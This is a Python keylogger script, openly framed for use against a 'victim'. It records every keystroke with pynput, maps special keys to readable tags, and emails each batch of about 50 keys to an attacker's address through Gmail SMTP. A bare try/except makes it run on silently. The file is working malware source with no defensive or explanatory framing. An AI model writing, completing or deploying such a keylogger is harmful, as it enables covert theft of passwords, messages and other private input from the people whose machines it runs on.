from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import datetime
while True:
    try:
        lst = []


        def email_it():
            user_name = "" #Your Email address [ Sender E-mail] example@gmail.com
            password = "" #Sender E-mail password
            to_add = "" #Receiver E-mail address receiver@gmail.com
            subject = str(datetime.datetime.today()) + "Victim Keylogger Details " #Customize Your E-mail Subject
            message = ''

            for i in lst:
                message = message + i
            sss = MIMEMultipart()
            sss['From'] = user_name
            sss['To'] = to_add
            sss['Subject'] = subject

            sss.attach(MIMEText(message, 'plain'))

            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(user_name, password)
            mgs = sss.as_string()
            s.sendmail(user_name, to_add, mgs)
            s.quit()


        def write_to_list(key):
            lst_key = str(key)
            lst_key = lst_key.replace("'", "")
            lst_key = key_code(lst_key)
            lst.append(lst_key)

            if len(lst) > 50: #It will send you the E-mail once the victim typed 50 keys. Change according to your Limit.
                email_it()
                lst.clear()


        def key_code(letter):  # Add as much key as possible. It makes your E-mail to look clean.
            if letter == "Key.space":
                return " "
            if letter == "Key.shift":
                return " [SHFT]"
            if letter == "Key.ctrl_r":
                return "[CTRL] "
            if letter == "Key.enter":
                return " [ENTER]"
            if letter == "K ey.shift_r":
                return "[SHFT]"
            if letter == "Key.alt_l":
                return "[ALT]"
            if letter == "Key.backspace":
                return "[BCKSP]"
            if letter == "Key.ctrl_l":
                return "[CTRL]"
            if letter == "Key.ctrl_la":
                return "[CTRL]"
            if letter == "Key.tab":
                return "[TAB]"
            if letter == "Key.end":
                return "[END]"

            else:
                return letter


        with Listener(on_press=write_to_list) as lis:
            lis.join()
    except:
        pass

